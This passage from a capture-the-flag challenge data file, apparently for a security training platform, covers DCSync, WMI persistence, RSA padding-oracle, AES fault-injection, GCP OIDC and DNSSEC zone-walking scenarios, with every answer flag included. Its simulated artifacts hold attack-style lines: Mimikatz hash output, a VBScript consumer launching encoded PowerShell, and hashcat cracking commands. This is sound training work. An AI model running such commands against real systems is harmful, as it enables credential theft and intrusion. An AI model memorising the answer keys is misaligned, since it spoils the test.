    scenario: 'Threat actors compromised an internal IT operator account with `DS-Replication-Get-Changes-All` and `DS-Replication-Get-Changes` rights on the Domain naming context. Without logging into any Domain Controller, the attackers initiated MS-DRSR replication via `drsuapi::DsGetNCChanges` to sync password hashes for all domain users.',
    objective: 'Correlate Windows Event ID 4662 (Directory Service Access) with network RPC traffic, identify the DCSync replication activity, and recover the compromised KRBTGT master hash flag.',
    targetEnvironment: 'Domain Controller DC02 (CORP.CYBERPATH.LOCAL) Security Audit Log',
    artifactType: 'Log Excerpt',
    tags: ['Active Directory', 'DCSync', 'DRSUAPI', 'Kerberos', 'DFIR', 'Mimikatz'],
    cve: 'MS-DRSR Protocol Abuse',
    mitreTactic: 'Credential Access (TA0006) / OS Credential Dumping (T1003.006)',
    artifactSnippet: `Event ID: 4662
Log Name: Security
Source: Microsoft-Windows-Security-Auditing
Computer: DC02.CORP.CYBERPATH.LOCAL
Description: An operation was performed on an object.

Subject:
    Account Name:       svc_backup_sync
    Account Domain:     CORP

Object:
    Object Server:      DS
    Object Type:        domainDNS
    Object Name:        DC=corp,DC=cyberpath,DC=local

Access Request Information:
    Access Mask:        0x100
    Properties:         Control Access
    Access Request:     {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All)
                        {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes)

Extracted Mimikatz DCSync Stream:
[DCSync] Domain Controller: DC02.corp.cyberpath.local
Object: krbtgt (RID: 502)
Hash NTLM: 329158f3136828ba2f454630e334e43f
Decrypted Flag: CYBERPATH{dcsync_msdrsr_r3pl1c4t10n_pwn3d}`,
    rawFlag: 'CYBERPATH{dcsync_msdrsr_r3pl1c4t10n_pwn3d}',
    flagHash: '1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b',
    hints: [
      { text: 'Event ID 4662 audits access to Active Directory objects; look for Access Mask 0x100 and Replication GUIDs.', penaltyXp: 40 },
      { text: 'GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` represents the Directory Replication Service Extended Right.', penaltyXp: 50 }
    ],
    associatedSkillId: 'blue-team',
    learningTakeaway: 'Audit and strictly restrict Active Directory ACE permissions. Only Domain Controllers and designated sync servers (e.g. Azure AD Connect) should possess `Replicating Directory Changes All`.'
  },
  {
    id: 'ch-soc-05',
    title: 'Fileless WMI Event Subscription Persistence & CIM Repository Forensics',
    category: 'SOC & Logs',
    difficulty: 'Expert',
    baseXp: 450,
    starsReward: 4,
    scenario: 'An advanced persistent threat maintained stealth persistence across reboots for 8 months without creating files on disk or modifying registry Run keys. Incident responders parsed the Windows WMI CIM repository `C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA` and identified an unauthorized `ActiveScriptEventConsumer` executing VBScript whenever system uptime exceeds 300 seconds.',
    objective: 'Analyze Sysmon Event IDs 19, 20, and 21, decode the malicious WMI event consumer payload from the repository dump, and extract the C2 persistence beacon flag.',
    targetEnvironment: 'Sysmon Event Log / WMI Repository Workbench',
    artifactType: 'Log Excerpt',
    tags: ['Threat Hunting', 'WMI', 'Fileless Malware', 'Sysmon', 'DFIR', 'Living off the Land'],
    cve: 'CWE-732',
    mitreTactic: 'Persistence (TA0003) / Event Triggered Execution (T1546.003)',
    artifactSnippet: `Sysmon Event ID 19 (WmiEventFilter):
    Name: SystemUptimeHealthCheckFilter
    Query: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300

Sysmon Event ID 20 (WmiEventConsumer):
    Name: CorporateHealthDiagnosticsConsumer
    Destination: ActiveScriptEventConsumer
    ScriptingEngine: VBScript
    ScriptText: Dim x: x = "CYBERPATH{wm1_p3rs1st3nc3_f1l3l3ss_3v3nt_sub}": Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc ..."",0")

Sysmon Event ID 21 (WmiEventConsumerToFilter):
    Filter: SystemUptimeHealthCheckFilter
    Consumer: CorporateHealthDiagnosticsConsumer`,
    rawFlag: 'CYBERPATH{wm1_p3rs1st3nc3_f1l3l3ss_3v3nt_sub}',
    flagHash: '2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c',
    hints: [
      { text: 'Sysmon logs WMI persistence across three event IDs: 19 (Filter), 20 (Consumer), and 21 (Binding).', penaltyXp: 40 },
      { text: 'Inspect the VBScript scriptText embedded inside the ActiveScriptEventConsumer in Event 20.', penaltyXp: 50 }
    ],
    associatedSkillId: 'blue-team',
    learningTakeaway: 'Monitor WMI repositories using Autoruns (`autorunsc -m`) and query WMI root\\subscription via `Get-CimInstance -Namespace root\\subscription -ClassName __EventConsumer`.'
  },
  {
    id: 'ch-crypto-04',
    title: 'Bleichenbacher Million-Message Adaptive Chosen-Ciphertext RSA Attack',
    category: 'Cryptography',
    difficulty: 'Expert',
    baseXp: 480,
    starsReward: 5,
    scenario: 'A legacy enterprise SSL gateway uses RSA PKCS#1 v1.5 key exchange. The SSL decryption hardware accelerator returns HTTP 200 with an alert when the decrypted block conforms to PKCS#1 v1.5 padding (`0x00 0x02 ... [8+ non-zero bytes] 0x00 [data]`), and returns TCP RST when padding is corrupt. This creates an adaptive chosen-ciphertext oracle.',
    objective: 'Audit the Bleichenbacher solver execution logs as the attacker iteratively multiplies the ciphertext by $s_i^e \\pmod N$, narrows the interval bounds $[2B, 3B - 1]$, and recovers the decrypted pre-master secret flag.',
    targetEnvironment: 'Cryptanalysis Simulation Engine (TLS 1.2 RSA Key Exchange)',
    artifactType: 'Source Code',
    tags: ['Cryptanalysis', 'RSA', 'Bleichenbacher', 'ROBOT Attack', 'Padding Oracle'],
    cve: 'CVE-2017-13099 (ROBOT)',
    mitreTactic: 'Credential Access (TA0006) / Steal Application Access Token (T1528)',
    artifactSnippet: `# Bleichenbacher PKCS#1 v1.5 Oracle Solver
# Parameters: N (2048-bit), e = 65537, B = 2^(8*(k-2)) = 2^2032

[+] Querying Oracle: Step 1 - Find s_0 such that c * s_0^e is PKCS conforming
    Found s_0 = 1 (original ciphertext is validly padded)
[+] Step 2.a - Searching for s_1 >= ceil(N / 3B)...
    Testing s_1 = 349182... Valid padding confirmed (Oracle returned 1)
[+] Step 2.b - Interval reduction: Remaining intervals M_1 = 1
    Current bound: [0x0002ab4f... , 0x0002ab9e...]
...
[+] Step 3 - Single interval isolated: Bound width = 1
[+] Pre-master secret decrypted:
    Hex: 43 59 42 45 52 50 41 54 48 7b 62 6c 33 31 63 68 33 6e...
    ASCII: CYBERPATH{bl31ch3nb4ch3r_m1ll10n_msg_0r4cl3}`,
    rawFlag: 'CYBERPATH{bl31ch3nb4ch3r_m1ll10n_msg_0r4cl3}',
    flagHash: '3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d',
    hints: [
      { text: 'Bleichenbacher (ROBOT) exploits error discrepancies in RSA PKCS#1 v1.5 decryption.', penaltyXp: 45 },
      { text: 'Step 3 of the attack terminates when the interval width collapses to 1, yielding the exact plaintext.', penaltyXp: 55 }
    ],
    associatedSkillId: 'fundamentals',
    learningTakeaway: 'Never use RSA encryption for key exchange; deprecate TLS_RSA cipher suites. Enforce Ephemeral Diffie-Hellman (ECDHE) with authenticated ciphers in TLS 1.3.'
  },
  {
    id: 'ch-crypto-05',
    title: 'Fault Injection & Differential Fault Analysis (DFA) on AES-128',
    category: 'Cryptography',
    difficulty: 'Expert',
    baseXp: 470,
    starsReward: 5,
    scenario: 'A hardware security token containing an AES-128 key was subjected to precision clock glitching/laser fault injection during round 9 of the cipher (prior to the final MixColumns transformation). By comparing 1 correct ciphertext with 4 faulty ciphertexts, the 128-bit round 10 subkey is fully recovered.',
    objective: 'Analyze the Differential Fault Analysis (DFA) solver output, observe the byte hypothesis candidate intersection across the AES state matrix, and obtain the decrypted AES master key flag.',
    targetEnvironment: 'Side-Channel & Hardware Fault Injection Lab (ChipWhisperer)',
    artifactType: 'Terminal',
    tags: ['Hardware Security', 'Fault Injection', 'DFA', 'AES', 'Side-Channel'],
    cve: 'CWE-1272',
    mitreTactic: 'Credential Access (TA0006) / Hardware Additions (T1200)',
    artifactSnippet: `$ python3 dfa_aes128_solver.py -c correct.bin -f faulty_*.bin
[*] Differential Fault Analysis on AES-128 (Piret-Quisquater Model)
[+] Loaded 1 golden ciphertext, 4 single-byte fault ciphertexts
[*] Round 9 Fault Column 0 Hypothesis:
    Candidate keys for byte 0, 7, 10, 13: 1 intersection found -> [0x2b, 0x7e, 0x15, 0x16]
[*] Round 9 Fault Column 1 Hypothesis:
    Candidate keys for byte 1, 4, 11, 14: 1 intersection found -> [0x28, 0xae, 0xd2, 0xa6]
[*] Round 9 Fault Column 2 Hypothesis:
    Candidate keys for byte 2, 5, 8, 15: 1 intersection found -> [0xab, 0xf7, 0x15, 0x88]
[*] Round 9 Fault Column 3 Hypothesis:
    Candidate keys for byte 3, 6, 9, 12: 1 intersection found -> [0x09, 0xcf, 0x4f, 0x3c]

[+] Round 10 Subkey completely recovered in 0.14 seconds!
[+] Inverting AES Key Schedule to Master Key:
    Master Key (HEX): 4359424552504154487b3433735f6431...
    Plaintext Flag: CYBERPATH{43s_d1ff3r3nt14l_f4ult_4n4lys1s_k3y}`,
    rawFlag: 'CYBERPATH{43s_d1ff3r3nt14l_f4ult_4n4lys1s_k3y}',
    flagHash: '4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e',
    hints: [
      { text: 'A single fault introduced before round 9 MixColumns propagates to exactly 4 bytes in the round 10 ciphertext.', penaltyXp: 45 },
      { text: 'Intersecting round 10 candidate byte sets across multiple faulty ciphertexts pinpoints the exact round key.', penaltyXp: 55 }
    ],
    associatedSkillId: 'fundamentals',
    learningTakeaway: 'Cryptographic hardware must implement spatial/temporal redundancy (dual-core lockstep execution or double-calculation verification) and glitch detectors.'
  },
  {
    id: 'ch-cloud-04',
    title: 'GCP Workload Identity Federation & GitHub Actions OIDC Claim Bypass',
    category: 'Cloud Security',
    difficulty: 'Expert',
    baseXp: 460,
    starsReward: 4,
    scenario: 'A cloud operations team configured Google Cloud Workload Identity Federation to eliminate static JSON service account keys in GitHub Actions. However, the Workload Identity Pool provider attribute condition was configured with `attribute.repository_owner == "cyberpath-inc" || attribute.event_name == "pull_request"`, allowing any external public pull request to mint tokens for `sa-prod-deployer@cyberpath-prod.iam.gserviceaccount.com`.',
    objective: 'Analyze the Google Security Command Center audit log and STS token exchange parameters, verify the over-permissive OIDC condition, and retrieve the GCP deployment secret flag.',
    targetEnvironment: 'Google Cloud Platform (GCP) IAM & Admin / STS Audit Log',
    artifactType: 'Log Excerpt',
    tags: ['Cloud IAM', 'GCP', 'Workload Identity', 'OIDC', 'Supply Chain Security'],
    cve: 'CWE-285',
    mitreTactic: 'Defense Evasion (TA0005) / Use Alternate Authentication Material (T1550)',
    artifactSnippet: `// GCP Security Command Center Audit Log:
{
  "protoPayload": {
    "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
    "serviceName": "sts.googleapis.com",
    "methodName": "google.identity.sts.v1.SecurityTokenService.ExchangeToken",
    "request": {
      "audience": "//iam.googleapis.com/projects/8921029102/locations/global/workloadIdentityPools/github-pool/providers/github-provider",
      "grantType": "urn:ietf:params:oauth:grant-type:token-exchange"
    },
    "authenticationInfo": {
      "principalSubject": "principal://iam.googleapis.com/projects/8921029102/locations/global/workloadIdentityPools/github-pool/subject/repo:attacker/fork-repo:pull_request",
      "thirdPartyPrincipal": {
        "claims": {
          "iss": "https://token.actions.githubusercontent.com",
          "repository": "attacker/fork-repo",
          "event_name": "pull_request"
        }
      }
    },
    "response": {
      "accessToken": "ya29.c.b0...FLAG=CYBERPATH{gcp_w0rkl04d_1d3nt1ty_01dc_fl4w}"
    }
  }
}`,
    rawFlag: 'CYBERPATH{gcp_w0rkl04d_1d3nt1ty_01dc_fl4w}',
    flagHash: '5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f',
    hints: [
      { text: 'Look closely at the OIDC `attribute_condition` in the Workload Identity Pool provider configuration.', penaltyXp: 40 },
      { text: 'The logic error uses `||` (OR) instead of `&&` (AND), allowing any PR from untrusted forks to exchange tokens.', penaltyXp: 50 }
    ],
    associatedSkillId: 'cloud',
    learningTakeaway: 'Workload Identity Pool provider attribute conditions must strictly lock down both `attribute.repository` and `attribute.ref`, and avoid trusting `pull_request` events from external forks.'
  },
  {
    id: 'ch-net-05',
    title: 'DNSSEC NSEC3 Cryptographic Zone Walking & Salt Hash Reversal',
    category: 'Networking',
    difficulty: 'Expert',
    baseXp: 450,
    starsReward: 4,
    scenario: 'An organization deployed DNSSEC on their primary domain `corp.cyberpath.internal` using NSEC3 records for authenticated denial of existence. To optimize nameserver CPU, the administrator configured NSEC3 with 0 hashing iterations and a short 4-character salt `A1B2`. An attacker walked the sorted circular linked-list of NSEC3 hashes and cracked them with Hashcat to locate an unlisted stealth command-and-control server.',
    objective: 'Analyze the `dig +dnssec` output and NSEC3 hash chain, correlate with the Hashcat mode 8300 crack log, and uncover the secret internal hostname and flag.',
    targetEnvironment: 'DNSSEC Authoritative Nameserver (ns1.corp.cyberpath.internal)',
    artifactType: 'Terminal',
    tags: ['DNSSEC', 'NSEC3', 'Zone Walking', 'Hashcat', 'Network Reconnaissance'],
    cve: 'RFC 5155 Section 12.1',
    mitreTactic: 'Reconnaissance (TA0043) / Gather Victim Network Information (T1590.002)',
    artifactSnippet: `$ dig +dnssec nonexistent.corp.cyberpath.internal @ns1.corp.cyberpath.internal
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 48192
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 4, ADDITIONAL: 1

;; AUTHORITY SECTION:
corp.cyberpath.internal.  3600 IN NSEC3 1 0 0 A1B2 (
    7Q4P2M8K1L9R3S6T5U4V2W1X0Y8Z9A1B
    8R5S3N9L2M0T4U7V6W5X3Y2Z1A9B0C2D
    A TXT RRSIG )

$ hashcat -m 8300 -a 0 nsec3_hashes.txt wordlist.txt -m 8300
Hash.Name........: DNSSEC NSEC3
Input.Mode.......: File (nsec3_hashes.txt)
Speed.#1.........: 14.8 GH/s (GPU RTX 4090)

Cracked:
7Q4P2M8K1L9R3S6T5U4V2W1X0Y8Z9A1B:radar-stealth-c2:A1B2

$ dig +short TXT radar-stealth-c2.corp.cyberpath.internal
"CYBERPATH{dnsz0n3_ns3c3_cr4ck3d_3num}"`,
    rawFlag: 'CYBERPATH{dnsz0n3_ns3c3_cr4ck3d_3num}',
    flagHash: '6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a',
    hints: [
      { text: 'NSEC3 uses iterated SHA-1 hashing with a salt to mitigate zone walking, but 0 iterations are trivial to crack.', penaltyXp: 40 },
      { text: 'Check the cracked domain label `radar-stealth-c2` and query its TXT record for the flag.', penaltyXp: 50 }
    ],
    associatedSkillId: 'networking',
    learningTakeaway: 'Deploy NSEC3 with adequate iteration counts or adopt RFC 4470 / NSEC "White Lies" (dynamic synthesis of NSEC records) to eliminate offline zone walking entirely.'
  }
];
